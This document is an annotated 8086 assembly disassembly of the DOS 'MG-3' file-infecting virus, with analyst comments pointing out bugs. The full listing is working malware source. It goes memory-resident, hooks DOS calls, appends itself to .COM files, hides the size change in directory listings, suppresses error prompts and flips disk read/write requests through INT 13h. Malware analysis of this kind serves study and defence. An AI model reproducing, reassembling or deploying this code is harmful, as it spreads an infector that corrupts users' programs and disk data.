	page	,132
;
;  name: mg-3.vom
;
;  program type: com/bin
;
;  cpu type: 8086
;
;  program loaded at 0000:01f8
;
;  physical eof at 0000:03f5
;
;  program entry point at 0000:01f8
;
fun	segment
assume	cs:fun,ds:fun,es:fun,ss:fun
;
;  references before the start of code space
;
	org	0006h
h_0006	label	word
	org	004ch
h_004c	label	word
	org	004eh
h_004e	label	word
	org	0090h
h_0090	label	word
	org	0092h
h_0092	label	word
;
;  data references to code space addresses
;
;	org	0339h
;h_0339	label	byte
;
;  start of program
;
	org	01f8h
h_01f8:
	call	h_0204				;goto virus
	nop	
	mov	ax,4c00h
	int	21h				;terminate program
;
h_0201	db	0ebh,02h,90h			;saved_prog_start
h_0204:
	xchg	ax,dx				;save ax
	pop	di				;get return address
	dec	di				;back by 2
	dec	di				;to CALL ofs
	mov	si,[di]				;get call ofs
	dec	di				;back 1 to start of program
	add	si,di				;call ofs plus prog start
						;= saved_prog_start
	push	cs				;save cs
	push	di				;and di for program start
	cld					;up!
	movsw					;replace 1st word
	movsb					;and 3rd byte of program
	mov	ax,4b04h			;fn = virus ID
	int	21h				;call DOS
	jae	h_027f				;OK (installed), skip this
	xor	ax,ax				;get a 0
	mov	es,ax				;address INT seg
	mov	di,0204h			;es:di = new virus home
	mov	cx,offset h_03f5-h_0204		;virus size (01f1h)
	repz	movsb				;copy virus to low mem
	les	di,[0006h]			;get seg:ofs of CPMtype doscall
	mov	al,0eah				;JMPF instruction
	dec	cx				;cx = 0FFFFh
	repnz	scasb				;find JMPF
	les	di,es:[di]			;get seg:ofs to DOS
	sub	di,-21h				;up to ??
	jmp	0000h:0239h			;goto virus in low memory
h_0239:
	push	es				;DOS seg
	pop	ds				;to ds
	mov	si,[di-04h]			;get ptr to max_dos_fn
	lodsb					;get that byte
	cmp	al,68h				;at least 68?
	mov	[di-03h],al			;set immediate compare value
	mov	word ptr [di-05h],0fc80h	;CMP AH,xx instruction
	mov	word ptr [di-07h],0fccdh	;INT 0FCH instruction
	push	cs				;current segment
	pop	ds				;to ds
	mov	[03fch],di			;set INT FF ofs to DOS entry
	mov	[03feh],es			;and INT FF seg to DOS entry
				;BUG: need to have INT FF point to the
				;     CMP AH,xx instruction they
				;     have set up!!!
	mov	byte ptr [h_0339],0ah		;set dosver_skip
	jnae	h_026e				;not DOS 3.3+, skip this
	mov	byte ptr [h_0339],00h		;reset dosver_skip
	mov	word ptr [h_07b4],offset h_03db	;set ofs of saved INT 13 vector
	mov	[h_07b6],cs			;and seg of saved INT 13 vector
						;in IBMBIO.COM
				;NOTE: How stable are these locations?!?!?!
h_026e:
	mov	al,0a9h				;TEST AX,xxxx instruction
h_0270:
	repnz	scasb				;find it
	cmp	word ptr es:[di],-28h		;immediate value = 0FFD8h?
				;NOTE: test for illegal flag values
	jnz	h_0270				;no, try again
	mov	al,18h				;new immediate value: 0FF18h
				;NOTE: remove "our" flag from illegal values
	stosb					;modify test instr
	push	ss				;copy PSP seg
	pop	ds				;to ds
	push	ss				;and again
	pop	es				;to es
h_027f:
	xchg	ax,dx				;get original AX back
	retf					;and execute infected program
;
;			intfchere
;
h_0281:
	push	ax				;save regs
	push	dx
	push	ds
	push	cx
	push	bx
	push	es
	cmp	ax,4b04h			;fn = virus ID?
	jz	h_02ad				;yes, cleanup and exit NC
	xchg	ax,cx				;save ax
	mov	ah,2fh				;fn = get DTA
	int	0ffh				;call DOS
	cmp	ch,11h				;fn = FCB find first?
	jz	h_029b				;yes, stop here
	cmp	ch,12h				;fn = FCB find next?
	jnz	h_02b4				;no, skip this
h_029b:
	xchg	ax,cx				;get fn back
	int	0ffh				;call to DOS
	push	ax				;save return code
	test	byte ptr es:[bx+13h],0c0h	;check our attribute bits
	jz	h_02ac				;not set, skip this
	sub	word ptr es:[bx+24h],offset h_03f5-h_0201
					;update filesize to hide virus (01f4h)
h_02ac:
	pop	ax				;restore regs
h_02ad:
	pop	es
	pop	bx
	pop	cx
	add	sp,+0ch				;cleanup stack
	iret					;and return to caller
				;BUG: Should preserve returned flags!
h_02b4:
	mov	ah,19h				;fn = get current disk
	int	0ffh				;call to DOS
	push	ax				;save disk
	cmp	ch,36h				;fn = get disk free space?
	jz	h_02e9				;yes, stop here
	cmp	ch,4eh				;fn = find first?
	jz	h_02e0				;yes, stop here
	cmp	ch,4bh				;fn = load/execute?
	jz	h_02e0				;yes, stop here
	cmp	ch,47h				;fn = get current dir?
	jnz	h_02d1				;no, skip this
	cmp	al,02h				;drive >= C:?
	jae	h_02ee				;yes, stop here
h_02d1:
	cmp	ch,5bh				;fn = create new file?
	jz	h_02e0				;yes, stop here
	shr	ch,1				;fn / 2
	cmp	ch,1eh				;fn = 3C or 3D?
						;create file or open file?
	jz	h_02e0				;yes, stop here
	jmp	h_03bb				;else continue DOS call
h_02e0:
	mov	ax,121ah			;fn = get file's drive
	xchg	si,dx				;ds:si = filename
	int	2fh				;multiplex interrupt
	xchg	ax,dx				;ax = old si, dx = drive
	xchg	ax,si				;old si to si
h_02e9:
	mov	ah,0eh				;fn = set current disk
	dec	dx				;drive A: = 0, B: = 2, etc
	int	0ffh				;call to DOS
h_02ee:
	push	es				;save dta seg
	push	bx				;and dta ofs
	sub	sp,+2ch				;allocate locals
	mov	dx,sp				;get ptr to local DTA
	push	sp				;save ptr to local DTA
	mov	ah,1ah				;fn = set DTA
	push	ss				;stack segment
	pop	ds				;is DTA seg
	int	0ffh				;call to DOS
	mov	bx,dx				;bx = ptr to DTA
	push	cs				;current segment
	pop	ds				;to ds
	mov	ah,4eh				;fn = find first matching file
	mov	dx,offset h_03e9		;ds:dx = wildcard_com
	mov	cx,0003h			;attributes = HIDDEN, Read-Only
	int	0ffh				;call to DOS
	jnae	h_0319				;error, cleanup and exit
h_030c:
	test	byte ptr ss:[bx+15h],80h	;our attribute set?
	jz	h_031c				;no, continue
			;BUG: If it will re-infect a file with the
			;     MG-2 attribute set, then the above
			;     size change mask will FAIL!
h_0313:
	mov	ah,4fh				;fn = find next matching file
	int	0ffh				;call to DOS
	jae	h_030c				;OK, check out this file
h_0319:
	jmp	h_03b2				;cleanup and exit
h_031c:
	cmp	byte ptr ss:[bx+1bh],0fdh	;file too big?
	ja	h_0313				;yes, try next file
	mov	word ptr [0090h],offset h_03c7	;set INT24HERE ofs
	mov	[0092h],cs			;and INT24HERE seg
				;NOTE: The original values are NOT saved!
	les	ax,[004ch]			;get INT 13 vector
	mov	[h_03f7],ax			;save oldint13ofs
	mov	[h_03f9],es			;and oldint13seg
h_0339	equ	$+1		;dosver_skip
	jmp	short h_033a			;if not DOS 3.3+, skip this
h_033a:
	mov	word ptr [004ch],offset h_03ca	;set ofs of INT13HERE_2
	mov	[004eh],cs			;and new INT 13 seg, too
;
;   dosver_skip comes here
;
	push	ss				;DTA seg
	pop	ds				;to ds
	push	word ptr [bx+16h]		;save file time
	push	word ptr [bx+18h]		;and file date
	push	word ptr [bx+15h]		;and file attributes
	lea	dx,[bx+1eh]			;ds:dx = name found in DTA
	mov	ax,4301h			;fn = set file attributes
	pop	cx				;get file attributes
	and	cx,00feh			;high byte, R/O bit off
	or	cl,0c0h				;set our attributes
	int	0ffh				;call to DOS
	mov	ax,3d02h			;fn = open file for read/write
	int	0ffh				;call to DOS
	xchg	ax,bx				;handle to bx
	push	cs				;current segment
	pop	ds				;to ds
	mov	ah,3fh				;fn = read file
	mov	cx,0003h			;size of saved_prog_start
	mov	dx,offset h_0201		;ds:dx = saved_prog_start
	int	0ffh				;call to DOS
	mov	ax,4202h			;fn = lseek to EOF+CX:DX
	xor	dx,dx				;cx:dx = 0
	mov	cx,dx
	int	0ffh				;call to DOS
	mov	[h_03f5],ax			;save virus_call_ofs
	mov	ah,40h				;fn = write to file
	mov	cx,offset h_03f5-h_0201		;virus size (01f4h)
	mov	dx,offset h_0201		;ds:dx = this virus
	int	0ffh				;call to DOS
	jnae	h_039c				;error, cleanup and quit
	mov	ax,4200h			;fn = lseek to BOF+CX:DX
	xor	dx,dx				;cx:dx = 0
	mov	cx,dx
	int	0ffh				;call to DOS
	mov	ah,40h				;fn = write to file
	mov	cx,0003h			;size of virus_call
	mov	dx,offset h_03f4		;ds:dx = virus_call
	int	0ffh				;call to DOS
h_039c:
	mov	ax,5701h			;fn = set file time/date
	pop	dx				;restore file date
	pop	cx				;and file time
	int	0ffh				;call to DOS
	mov	ah,3eh				;fn = close file
	int	0ffh				;call to DOS
	les	ax,[h_03f7]			;get oldint13
	mov	[004ch],ax			;restore INT 13 ofs
	mov	[004eh],es			;and INT 13 seg
h_03b2:
	add	sp,+2eh				;clean stuff off stack
	pop	dx				;restore old DTA ofs
	pop	ds				;and old DTA seg
	mov	ah,1ah				;fn = set DTA
	int	0ffh				;call to DOS
h_03bb:
	pop	dx				;get default drive back
	mov	ah,0eh				;fn = set current drive
	int	0ffh				;call to DOS
	pop	es				;restore regs
	pop	bx
	pop	cx
	pop	ds
	pop	dx
	pop	ax
	iret					;continue INT 21
;
;			int24here
;
h_03c7:
	mov	al,03h				;response = FAIL
	iret					;and done
;
;			int13here_2
;
h_03ca:
	cmp	ah,03h				;fn = write?
	jnz	h_03d6				;no, skip this
	inc	byte ptr cs:[h_03ef]		;update ??
	dec	ah				;change function to read
h_03d6:
	jmp	dword ptr cs:[h_03f7]		;and continue INT 13
;
;			int13here
;
h_03db:
	shr	byte ptr cs:[h_03ef],1		;update ??
	jae	h_03e4				;yes, skip this
	inc	ah				;change function
			;i.e. read changes to write, etc!
h_03e4:
	jmp	dword ptr cs:[h_07b0]		;continue INT 13
;
h_03e9	db	"* .COM"			;wildcard_com
h_03ef	db	00h
			;NOTE: location of following data CANNOT change!
h_03f0	dw	h_0281,0000h			;INT 0FCH vector!
h_03f4	db	0e8h				;virus_call
h_03f5	equ	$
;
;  references after the end of code space
;
	org	03f5h
h_03f5	label	word		;virus_call_ofs
	org	03f7h
h_03f7	label	word		;oldint13ofs
	org	03f9h
h_03f9	label	word		;oldint13seg
fun	ends
	end	h_01f8
